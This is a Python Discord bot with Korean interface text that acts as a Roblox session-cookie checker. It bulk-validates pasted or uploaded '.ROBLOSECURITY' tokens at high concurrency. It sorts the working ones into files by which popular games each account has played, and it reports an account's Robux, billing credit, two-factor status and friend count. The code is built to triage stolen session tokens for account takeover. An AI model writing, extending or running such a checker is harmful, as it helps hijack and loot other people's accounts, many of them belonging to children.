# -*- coding: utf-8 -*-
import os
import re
import io
import asyncio
import aiohttp
import datetime as dt

import discord
from discord.ext import commands
from discord import Interaction, TextStyle
from discord.ui import View, Modal, TextInput

# ========================
# 환경변수
# ========================
TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")  # 선택: 숫자. 비우면 글로벌 싱크

# ========================
# 표시/동작 정책
# ========================
MENU_PUBLIC = True                  # 메뉴는 공개
RESULTS_EPHEMERAL = True           # 결과는 나만 보이게
RESULTS_PUBLIC_DELETE_AFTER = 300  # 공개 결과일 때 삭제 타이머(초)

# “사실상 무제한” 처리 청크/동시성
CHUNK_SIZE = 500        # 청크 크기(권장 200~500)
CONCURRENCY = 5         # 동시 요청(권장 3~5, 과하면 429 위험)
MAX_TOTAL = 0           # 0이면 전체 한도 해제(실전 무제한). 안전장치 쓰려면 숫자 입력

# ========================
# 이모지/색상
# ========================
EMO = {"ok": "✅", "warn": "⚠️", "err": "❌"}
COLOR_BLACK = discord.Color.from_rgb(0, 0, 0)

# ========================
# 임베드 유틸
# ========================
def make_embed(title: str | None = None, desc: str = "") -> discord.Embed:
    emb = discord.Embed(description=desc, color=COLOR_BLACK)
    if title:
        emb.title = title
    return emb

def main_menu_embed() -> discord.Embed:
    return discord.Embed(
        title="쿠키 체커",
        description="쿠키 체커를 원하시면 아래 버튼을 눌러주세요",
        color=COLOR_BLACK
    )

# ========================
# 공통 응답
# ========================
async def send_result(inter: Interaction, *, embed: discord.Embed,
                      view: discord.ui.View | None = None,
                      file: discord.File | None = None,
                      files: list[discord.File] | None = None):
    files = files or ([file] if file else None)
    if RESULTS_EPHEMERAL:
        if not inter.response.is_done():
            await inter.response.send_message(embed=embed, view=view, files=files, ephemeral=True)
        else:
            await inter.followup.send(embed=embed, view=view, files=files, ephemeral=True)
    else:
        if not inter.response.is_done():
            await inter.response.send_message(embed=embed, view=view, files=files, delete_after=RESULTS_PUBLIC_DELETE_AFTER)
        else:
            await inter.followup.send(embed=embed, view=view, files=files, delete_after=RESULTS_PUBLIC_DELETE_AFTER)

# ========================
# 게임 프리셋(고정 universeId)
# ========================
GAMES = {
    "그로우 어 가든": {
        "key": "grow_a_garden",
        "universeId": 7436755782,
        "welcomeBadgeIds": []
    },
    "입양하세요": {
        "key": "adopt_me",
        "universeId": 383310974,
        "welcomeBadgeIds": []
    },
    "브레인롯": {
        "key": "brainrot",
        "universeId": 7709344486,
        "welcomeBadgeIds": []
    },
    "블록스피스": {
        "key": "blox_fruits",
        "universeId": 994732206,
        "welcomeBadgeIds": []
    },
}

# ========================
# 유틸
# ========================
def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i+n]

# ========================
# 쿠키 파싱/검증
# ========================
def extract_cookie_variants(s: str) -> tuple[str | None, str | None]:
    """
    입력 문자열 s에서 .ROBLOSECURITY 값을 뽑는다.
    반환: (auth_value, out_value)
      - auth_value: 인증에 쓸 값(실제 쿠키 값)
      - out_value : 결과 파일에 그대로 쓸 값(가능하면 '_|WARNING'부터)
    """
    if not s:
        return None, None
    s = s.strip()

    # _|WARNING… 패턴이 있으면 그 지점부터
    m_w = re.search(r"(_\|WARNING[^\s;]+)", s)
    if m_w:
        token = m_w.group(1).strip()
        return token, token

    # .ROBLOSECURITY=값
    m_eq = re.search(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s;]+)", s)
    if m_eq:
        val = m_eq.group(1).strip()
        if "_|WARNING" in val:
            idx = val.find("_|WARNING")
            out = val[idx:]
        else:
            out = val
        return val, out

    # 키 없이 값만(충분히 길고 공백 없음)
    if len(s) > 50 and " " not in s and "\n" not in s and "\t" not in s:
        if "_|WARNING" in s:
            idx = s.find("_|WARNING")
            token = s[idx:]
            return token, token
        return s, s

    return None, None

def parse_cookies_blob(raw: str) -> list[tuple[str, str]]:
    """
    raw 텍스트에서 쿠키들을 파싱.
    반환: [(auth_value, out_value), ...]
    """
    parts = re.split(r"[\r\n,]+", (raw or "").strip())
    out: list[tuple[str, str]] = []
    seen = set()
    for part in parts:
        auth, outv = extract_cookie_variants(part)
        if auth and outv and auth not in seen:
            seen.add(auth)
            out.append((auth, outv))
    return out

async def check_cookie_once(cookie_value: str) -> tuple[bool, str | None, int | None, str | None]:
    """
    단일 쿠키 인증.
    return: (ok, err, user_id, username/displayName)
    """
    try:
        async with aiohttp.ClientSession(cookies={'.ROBLOSECURITY': cookie_value}) as session:
            async with session.get('https://users.roblox.com/v1/users/authenticated') as resp:
                text = await resp.text()
                if '"id":' in text:
                    data = await resp.json()
                    return True, None, int(data.get('id')), data.get('name') or data.get('displayName')
                if 'Unauthorized' in text or resp.status == 401:
                    return False, None, None, None
                return False, f"unexpected {resp.status}", None, None
    except Exception as e:
        return False, f"{type(e).__name__}: {e}", None, None

async def bulk_authenticate(pairs: list[tuple[str, str]]):
    sem = asyncio.Semaphore(CONCURRENCY)
    async def worker(auth_cookie: str):
        async with sem:
            return await check_cookie_once(auth_cookie)
    return await asyncio.gather(*[worker(auth) for auth, _ in pairs])

# ========================
# 배지/플레이 이력
# ========================
async def get_user_badges(user_id: int, session: aiohttp.ClientSession, limit: int = 300) -> list[dict]:
    out, cursor = [], None
    base = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100&sortOrder=Desc"
    for _ in range(5):  # 최대 500개
        url = base + (f"&cursor={cursor}" if cursor else "")
        async with session.get(url) as r:
            if r.status != 200:
                break
            data = await r.json()
            out.extend(data.get("data", []))
            cursor = data.get("nextPageCursor")
            if not cursor or len(out) >= limit:
                break
    return out[:limit]

def badge_belongs_to_universe(badge: dict, uni_id: int) -> bool:
    uni = badge.get("awardingUniverse")
    return bool(isinstance(uni, dict) and int(uni.get("id")) == int(uni_id))

async def has_any_welcome_badge(user_id: int, welcome_ids: list[int], session: aiohttp.ClientSession) -> bool:
    if not welcome_ids:
        return False
    ids = ",".join(str(b) for b in welcome_ids[:50])
    url = f"https://badges.roblox.com/v1/users/{user_id}/badges/awarded-dates?badgeIds={ids}"
    async with session.get(url) as r:
        if r.status != 200:
            return False
        data = await r.json()
        return any(item.get("awardedDate") for item in data.get("data", []))

async def get_played_games_for_user(user_id: int, auth_cookie: str) -> set[str]:
    """
    유저가 '한번이라도 플레이'한 게임들을 GAMES[key] 기준으로 반환.
    반환: 내부 key 집합 (예: {'grow_a_garden', 'adopt_me'})
    """
    played = set()
    try:
        async with aiohttp.ClientSession(cookies={'.ROBLOSECURITY': auth_cookie}) as session:
            try:
                badges = await get_user_badges(user_id, session, limit=300)
            except Exception:
                badges = []

            for display_name, cfg in GAMES.items():
                internal_key = cfg.get("key")
                uni = cfg.get("universeId")
                welcome_ids = cfg.get("welcomeBadgeIds", [])

                if not uni:
                    continue

                related = [b for b in badges if badge_belongs_to_universe(b, int(uni))]
                played_flag = bool(related)

                if not played_flag and welcome_ids:
                    try:
                        played_flag = await has_any_welcome_badge(user_id, welcome_ids, session)
                    except Exception:
                        pass

                if played_flag and internal_key:
                    played.add(internal_key)
    except Exception:
        pass
    return played

# ========================
# 모달: 쿠키 검증(멀티 입력)
# ========================
class CookieModal(Modal, title="쿠키 검증"):
    cookie = TextInput(
        label=".ROBLOSECURITY 쿠키(여러 개 가능)",
        placeholder="한 줄에 하나씩 붙여넣기\n예)\n.ROBLOSECURITY=xxxxx\n.ROBLOSECURITY=yyyyy\n혹은 _|WARNING… 으로 시작하는 값",
        style=TextStyle.paragraph,
        required=True,
        max_length=8000
    )

    async def on_submit(self, inter: Interaction):
        await inter.response.defer(ephemeral=RESULTS_EPHEMERAL)

        pairs = parse_cookies_blob(str(self.cookie))  # [(auth,out)]
        if not pairs:
            emb = make_embed(title=f"{EMO['warn']} 입력 필요", desc="쿠키가 비어있어. 한 줄에 하나씩 입력해줘.")
            return await send_result(inter, embed=emb)

        # 과도 입력 상한(0이면 해제)
        if MAX_TOTAL and len(pairs) > MAX_TOTAL:
            pairs = pairs[:MAX_TOTAL]

        total_cnt = len(pairs)
        done_cnt = 0
        chunk_idx = 0

        for part in chunked(pairs, CHUNK_SIZE):
            chunk_idx += 1

            # 1) 인증
            auth_results = await bulk_authenticate(part)
            ok_entries = []  # [(auth, out, uid, uname)]
            for (auth, outv), res in zip(part, auth_results):
                ok, err, uid, uname = res
                if ok and uid:
                    ok_entries.append((auth, outv, uid, uname))

            # 2) 게임별 분류
            game_buckets: dict[str, list[str]] = {}
            if ok_entries:
                sem = asyncio.Semaphore(CONCURRENCY)
                async def one(item):
                    auth, outv, uid, uname = item
                    async with sem:
                        keys = await get_played_games_for_user(uid, auth)
                        return outv, keys

                played_results = await asyncio.gather(*[one(it) for it in ok_entries])
                for outv, keys in played_results:
                    for k in keys:
                        game_buckets.setdefault(k, []).append(outv)

            # 3) 파일 구성(작동되는 것만)
            files = []
            if ok_entries:
                buf_valid = io.BytesIO(("\n".join(outv for _, outv, _, _ in ok_entries)).encode("utf-8"))
                files.append(discord.File(buf_valid, filename=f"valid_cookies_part{chunk_idx}.txt"))

            key_to_filename = {
                "grow_a_garden": f"grow_a_garden_part{chunk_idx}.txt",
                "adopt_me":      f"adopt_me_part{chunk_idx}.txt",
                "brainrot":      f"brainrot_part{chunk_idx}.txt",
                "blox_fruits":   f"blox_fruits_part{chunk_idx}.txt",
            }
            key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}

            game_counts_lines = []
            for k, fname in key_to_filename.items():
                lst = game_buckets.get(k, [])
                if lst:
                    buf = io.BytesIO(("\n".join(lst)).encode("utf-8"))
                    files.append(discord.File(buf, filename=fname))
                disp = key_to_display.get(k, k)
                game_counts_lines.append(f"- {disp}: {len(lst)}개")

            # 4) 요약 임베드(청크별)
            done_cnt += len(part)
            success = len(ok_entries)
            fail    = len(part) - success
            desc = "\n".join(game_counts_lines) if game_counts_lines else ""
            desc = f"[{chunk_idx}] 처리 청크: {len(part)}개\n" + (desc or "게임별 분류 결과 없음")

            emb = make_embed(
                title=f"{EMO['ok']} 쿠키 검증 결과(청크 {chunk_idx})" if success else f"{EMO['err']} 쿠키 검증 결과(청크 {chunk_idx})",
                desc=desc
            )
            emb.add_field(name="총 개수(누적/전체)", value=f"{done_cnt} / {total_cnt}", inline=True)
            emb.add_field(name="로그인 성공(이번 청크)", value=str(success), inline=True)
            emb.add_field(name="로그인 실패(이번 청크)", value=str(fail), inline=True)

            await send_result(inter, embed=emb, files=files)

# ========================
# 모달: 전체 계정 정보(단일)
# ========================
class TotalCheckModal(Modal, title="전체 계정 정보 조회"):
    cookie = TextInput(label="로블록스 쿠키", style=TextStyle.short)

    async def on_submit(self, inter: Interaction):
        embed = make_embed()
        try:
            async with aiohttp.ClientSession(cookies={'.ROBLOSECURITY': self.cookie.value}) as session:
                async with session.get('https://users.roblox.com/v1/users/authenticated') as auth_res:
                    auth_text = await auth_res.text()
                    if '"id":' in auth_text:
                        user_id = (await auth_res.json())['id']

                        async def fetch_json(url: str):
                            async with session.get(url) as r:
                                return await r.json()

                        robux_task    = fetch_json(f'https://economy.roblox.com/v1/users/{user_id}/currency')
                        credit_task   = fetch_json('https://billing.roblox.com/v1/credit')
                        settings_task = fetch_json('https://www.roblox.com/my/settings/json')
                        friends_task  = fetch_json('https://friends.roblox.com/v1/my/friends/count')
                        voice_task    = fetch_json('https://voice.roblox.com/v1/settings')
                        thumb_task    = fetch_json(
                            f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}'
                        )

                        robux, credit, settings_data, friends, voice, thumb = await asyncio.gather(
                            robux_task, credit_task, settings_task, friends_task, voice_task, thumb_task
                        )

                        embed.set_author(name=f"{EMO['ok']} 전체 계정 정보")
                        embed.set_thumbnail(url=thumb.get('data', [{}])[0].get('imageUrl', 'N/A'))
                        embed.add_field(name="로벅스", value=f"{robux.get('robux', 0)} R$", inline=True)
                        embed.add_field(name="크레딧 잔액", value=f"{credit.get('balance', 0)} {credit.get('currencyCode', '')}", inline=True)
                        embed.add_field(name="닉네임", value=f"{settings_data.get('Name')} ({settings_data.get('DisplayName', '')})", inline=True)
                        embed.add_field(name="이메일 인증", value=str(settings_data.get('IsEmailVerified', False)), inline=True)
                        embed.add_field(name="계정 연차", value=f"{round(settings_data.get('AccountAgeInDays', 0)/365, 2)}년", inline=True)
                        embed.add_field(name="프리미엄", value=str(settings_data.get('IsPremium', False)), inline=True)
                        embed.add_field(name="2단계 인증", value=str(settings_data.get('MyAccountSecurityModel', {}).get('IsTwoStepEnabled', False)), inline=True)
                        embed.add_field(name="친구 수", value=str(friends.get('count', 0)), inline=True)
                        embed.add_field(name="음성 인증", value=str(voice.get('isVerifiedForVoice', False)), inline=True)

                    elif 'Unauthorized' in auth_text or auth_res.status == 401:
                        embed.set_author(name=f"{EMO['err']} 유효하지 않은 쿠키")
                        embed.add_field(name="결과", value="쿠키가 유효하지 않습니다.", inline=False)
                    else:
                        embed.set_author(name=f"{EMO['warn']} 오류 발생")
                        embed.add_field(name="서버 응답", value=f"```\n{auth_text}\n```", inline=False)
        except Exception as e:
            embed.set_author(name=f"{EMO['err']} 요청 실패")
            embed.add_field(name="에러", value=f"```\n{e}\n```", inline=False)

        await send_result(inter, embed=embed)

# ========================
# 파일검증 공용 로직(버튼/슬래시 공용, 청크 처리)
# ========================
async def handle_file_check_logic(inter: Interaction, raw_text: str):
    pairs = parse_cookies_blob(raw_text)  # [(auth,out)]
    if not pairs:
        emb = make_embed(title=f"{EMO['warn']} 쿠키 없음", desc="파일에서 쿠키를 찾지 못했어.")
        return await inter.followup.send(embed=emb, ephemeral=True)

    # 과도 입력 상한(0이면 해제)
    if MAX_TOTAL and len(pairs) > MAX_TOTAL:
        pairs = pairs[:MAX_TOTAL]

    total_cnt = len(pairs)
    done_cnt = 0
    chunk_idx = 0

    for part in chunked(pairs, CHUNK_SIZE):
        chunk_idx += 1

        # 1) 인증
        auth_results = await bulk_authenticate(part)
        ok_entries = []  # [(auth, out, uid, uname)]
        for (auth, outv), res in zip(part, auth_results):
            ok, err, uid, uname = res
            if ok and uid:
                ok_entries.append((auth, outv, uid, uname))

        # 2) 게임별 분류
        game_buckets: dict[str, list[str]] = {}
        if ok_entries:
            sem = asyncio.Semaphore(CONCURRENCY)
            async def one(item):
                auth, outv, uid, uname = item
                async with sem:
                    keys = await get_played_games_for_user(uid, auth)
                    return outv, keys

            played_results = await asyncio.gather(*[one(it) for it in ok_entries])
            for outv, keys in played_results:
                for k in keys:
                    game_buckets.setdefault(k, []).append(outv)

        # 3) 파일 구성(작동되는 것만, 파트별)
        files = []
        if ok_entries:
            buf_valid = io.BytesIO(("\n".join(outv for _, outv, _, _ in ok_entries)).encode("utf-8"))
            files.append(discord.File(buf_valid, filename=f"valid_cookies_part{chunk_idx}.txt"))

        key_to_filename = {
            "grow_a_garden": f"grow_a_garden_part{chunk_idx}.txt",
            "adopt_me":      f"adopt_me_part{chunk_idx}.txt",
            "brainrot":      f"brainrot_part{chunk_idx}.txt",
            "blox_fruits":   f"blox_fruits_part{chunk_idx}.txt",
        }
        key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}

        game_counts_lines = []
        for k, fname in key_to_filename.items():
            lst = game_buckets.get(k, [])
            if lst:
                buf = io.BytesIO(("\n".join(lst)).encode("utf-8"))
                files.append(discord.File(buf, filename=fname))
            disp = key_to_display.get(k, k)
            game_counts_lines.append(f"- {disp}: {len(lst)}개")

        # 4) 요약 임베드(청크별)
        done_cnt += len(part)
        success = len(ok_entries)
        fail    = len(part) - success
        desc = "\n".join(game_counts_lines) if game_counts_lines else ""
        desc = f"[{chunk_idx}] 처리 청크: {len(part)}개\n" + (desc or "게임별 분류 결과 없음")

        emb = make_embed(
            title=f"{EMO['ok']} 파일 검증 결과(청크 {chunk_idx})" if success else f"{EMO['err']} 파일 검증 결과(청크 {chunk_idx})",
            desc=desc
        )
        emb.add_field(name="총 개수(누적/전체)", value=f"{done_cnt} / {total_cnt}", inline=True)
        emb.add_field(name="로그인 성공(이번 청크)", value=str(success), inline=True)
        emb.add_field(name="로그인 실패(이번 청크)", value=str(fail), inline=True)

        await inter.followup.send(embed=emb, files=files or None, ephemeral=True)

# ========================
# 버튼 뷰(영구 뷰)
# ========================
class CheckView(View):
    def __init__(self):
        super().__init__(timeout=None)  # persistent

    @discord.ui.button(label="쿠키검증", style=discord.ButtonStyle.secondary, custom_id="cookie_check_btn")
    async def b1(self, inter: Interaction, button: discord.ui.Button):
        await inter.response.send_modal(CookieModal())

    @discord.ui.button(label="전체조회", style=discord.ButtonStyle.secondary, custom_id="total_check_btn")
    async def b2(self, inter: Interaction, button: discord.ui.Button):
        await inter.response.send_modal(TotalCheckModal())

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_check_btn")
    async def b3(self, inter: Interaction, button: discord.ui.Button):
        # 에페메럴 안내 후, 2분 안에 같은 채널에서 해당 유저가 txt 파일 올리면 처리(청크 분할)
        await inter.response.send_message(
            "txt 파일을 올려줘(2분 이내). 한 줄에 하나씩 .ROBLOSECURITY 넣어줘. _|WARNING… 형태도 그대로 인식해.",
            ephemeral=True
        )

        def check_msg(msg: discord.Message):
            if msg.author.id != inter.user.id:
                return False
            if msg.channel.id != inter.channel.id:
                return False
            return len(msg.attachments) > 0

        try:
            msg: discord.Message = await inter.client.wait_for("message", check=check_msg, timeout=120)
        except asyncio.TimeoutError:
            emb = make_embed(title=f"{EMO['warn']} 시간 초과", desc="2분 내 파일 업로드가 없어 취소됐어.")
            return await inter.followup.send(embed=emb, ephemeral=True)

        att: discord.Attachment = msg.attachments[0]
        if not att.filename.lower().endswith(".txt"):
            emb = make_embed(title=f"{EMO['warn']} 파일 형식 오류", desc="txt 파일만 지원해.")
            return await inter.followup.send(embed=emb, ephemeral=True)
        if att.size > 2 * 1024 * 1024:
            emb = make_embed(title=f"{EMO['warn']} 파일 용량 초과", desc="최대 2MB까지만 지원해.")
            return await inter.followup.send(embed=emb, ephemeral=True)

        try:
            raw = (await att.read()).decode("utf-8", errors="ignore")
        except Exception as e:
            emb = make_embed(title=f"{EMO['err']} 읽기 실패", desc=f"파일을 읽을 수 없었어. ({e})")
            return await inter.followup.send(embed=emb, ephemeral=True)

        await handle_file_check_logic(inter, raw)

# ========================
# 봇 본체
# ========================
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix=".", intents=intents)

    async def setup_hook(self):
        try:
            if GUILD_ID:
                gid = int(GUILD_ID)
                await self.tree.sync(guild=discord.Object(id=gid))
                print(f"[SYNC] 길드({gid}) 동기화 완료")
            else:
                synced = await self.tree.sync()
                print(f"[SYNC] 글로벌 동기화: {len(synced)}개 (전파 지연 가능)")
        except Exception as e:
            print("[SYNC] 실패:", e)

bot = MyBot()

@bot.event
async def on_ready():
    # 영구 뷰 등록
    try:
        bot.add_view(CheckView())
        print("[VIEW] persistent CheckView 등록 완료")
    except Exception as e:
        print("[VIEW] 등록 실패:", e)

    print(f"{dt.datetime.now(dt.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC → 로그인: {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Cookie Checker"))

# ========================
# 메뉴(공개)
# ========================
@bot.tree.command(name="체커", description="체커기 생성하기")
async def check(inter: Interaction):
    if MENU_PUBLIC:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView())
    else:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(), ephemeral=True)

# ========================
# 슬래시: 파일검증(청크 분할 + 게임별 파일 분배)
# ========================
@bot.tree.command(name="파일검증", description="txt 파일로 여러 개 쿠키를 일괄 검증(청크 처리 + 게임별 파일 분배)")
async def file_check(inter: Interaction, 파일: discord.Attachment):
    await inter.response.defer(ephemeral=RESULTS_EPHEMERAL)

    if not 파일.filename.lower().endswith(".txt"):
        emb = make_embed(title=f"{EMO['warn']} 파일 형식 오류", desc="txt 파일만 지원해.")
        return await send_result(inter, embed=emb)
    if 파일.size > 2 * 1024 * 1024:
        emb = make_embed(title=f"{EMO['warn']} 파일 용량 초과", desc="최대 2MB까지만 지원해.")
        return await send_result(inter, embed=emb)

    try:
        raw = (await 파일.read()).decode("utf-8", errors="ignore")
    except Exception as e:
        emb = make_embed(title=f"{EMO['err']} 읽기 실패", desc=f"파일을 읽을 수 없었어. ({e})")
        return await send_result(inter, embed=emb)

    await handle_file_check_logic(inter, raw)

if __name__ == "__main__":
    if not TOKEN:
        raise RuntimeError("환경변수 DISCORD_TOKEN 이 설정되지 않았습니다.")
    bot.run(TOKEN)
